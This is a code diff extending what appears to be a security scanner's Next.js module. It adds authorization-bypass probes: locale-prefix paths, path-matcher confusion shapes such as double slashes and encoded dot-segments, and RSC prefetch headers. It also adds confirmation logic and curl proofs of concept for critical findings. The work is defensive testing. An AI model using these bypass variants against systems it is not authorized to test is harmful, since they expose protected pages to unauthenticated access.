@@ -8,6 +8,11 @@ Three confirmed-by-differential bypass families, all read-only GETs:
     transport variants of a route, so protected pages render unauthenticated.
   * CVE-2026-44574 — injected query parameters (e.g. the `_rsc` cache-buster)
     alter the resolved route while middleware matches the clean path.
+  * May-2026 proxy/middleware authz batch — apps relying on middleware.js /
+    proxy.js for authorization were bypassable via an App-Router segment-prefetch
+    URL, a Pages-Router i18n default-locale path prefix, and dynamic-route /
+    path-matcher confusion (extra/normalised segments the matcher misses but the
+    route still resolves).
 
 Method: take a route middleware GATES (redirect to login or 401/403), resend it
 as each bypass variant, and confirm the protected content actually came back —
@@ -15,7 +20,13 @@ the variant returns 2xx with a substantive body that is NOT the login page and i
 materially larger than the gated baseline (or arrives as a `text/x-component`
 Flight payload). Confirmation is automatic; nothing is modified.
 
-Refs: nvd.nist.gov CVE-2025-29927, CVE-2026-44575, CVE-2026-44574
+The React Server Components Server-Function deserialization RCE (CVE-2025-55182 /
+downstream CVE-2025-66478, CVSS 10) and the RSC DoS chain (CVE-2026-23869/23864)
+are version-bound and unsafe to actively confirm; they are covered by the nuclei
+full-template phase + the CVE-intel pass rather than probed here.
+
+Refs: nvd.nist.gov CVE-2025-29927, CVE-2026-44575, CVE-2026-44574,
+Vercel Next.js May-2026 coordinated security release.
 """
 from __future__ import annotations
 
@@ -68,6 +79,35 @@ def _rsc_variants(url: str) -> List[Tuple[str, str, dict]]:
          {"RSC": "1", "Next-Router-Segment-Prefetch": "/__PAGE__"}),
         ("_rsc query", url_qrsc, {"RSC": "1"}),
     ]
+
+
+def _path_variants(url: str) -> List[Tuple[str, str, dict]]:
+    """(label, url, headers) — the May-2026 proxy/middleware authz bypass batch:
+    i18n default-locale prefixes (Pages Router) + path-matcher confusion
+    (App/Pages Router dynamic-route + normalisation gaps middleware fails to match)."""
+    sp = urlsplit(url)
+    seg = (sp.path or "/").strip("/")
+    if not seg:
+        return []
+    out: List[Tuple[str, str, dict]] = []
+    # Pages-Router i18n default-locale path prefix
+    for loc in ("en", "en-US", "default"):
+        out.append((f"i18n locale prefix /{loc}",
+                    urlunsplit((sp.scheme, sp.netloc, f"/{loc}/{seg}", sp.query, "")), {}))
+    # path-matcher / dynamic-route confusion shapes
+    for cand, label in (
+        (f"//{seg}", "double-slash"),
+        (f"/{seg}/", "trailing-slash"),
+        (f"/{seg}/.", "trailing dot-segment"),
+        (f"/%2e/{seg}", "encoded dot-segment"),
+        (f"/{seg}..;/", "matrix-param confusion"),
+    ):
+        out.append((f"path confusion ({label})",
+                    urlunsplit((sp.scheme, sp.netloc, cand, sp.query, "")), {}))
+    # App-Router segment-prefetch transport on the clean path (proxy authz miss)
+    out.append(("segment-prefetch (proxy authz)", url,
+                {"RSC": "1", "Next-Router-Prefetch": "1", "Next-Url": sp.path or "/"}))
+    return out
 
 
 def _bypassed(base, r) -> bool:
@@ -139,5 +179,27 @@ def check(client: Client, gated_urls: List[str], fingerprints: List[dict]) -> Li
                          + " ".join(f"-H '{k}: {v}'" for k, v in hdrs.items())
                          + f" '{vurl}'")))
                 log("vuln", f"[critical] CVE-2026-44575 RSC bypass ({label}): {url}")
+                break
+
+        # --- May-2026 proxy/middleware authz batch: locale + path-matcher confusion ---
+        for label, vurl, hdrs in _path_variants(url):
+            r = client.get(vurl, phase="active", allow_redirects=False,
+                           extra_headers=hdrs or None)
+            if _bypassed(base, r):
+                findings.append(Finding(
+                    title="Next.js proxy/middleware authorization bypass (2026)",
+                    severity="critical", category="cve", target=url,
+                    evidence=(f"gated {base.status} on the normal request, but the "
+                              f"'{label}' variant ({vurl}) returned {r.status} with "
+                              f"protected content ({len(r.text or '')} B, not the login "
+                              "page) — middleware/proxy authorization was bypassed. EXPLOITED."),
+                    recommendation=("Upgrade Next.js to the May-2026 security release and "
+                                    "enforce authorization in the route handler, never only "
+                                    "in middleware.js/proxy.js."),
+                    confidence="confirmed",
+                    poc=(f"curl -s "
+                         + " ".join(f"-H '{k}: {v}'" for k, v in (hdrs or {}).items())
+                         + f" '{vurl}'")))
+                log("vuln", f"[critical] Next.js proxy-authz bypass ({label}): {url}")
                 break
     return findings
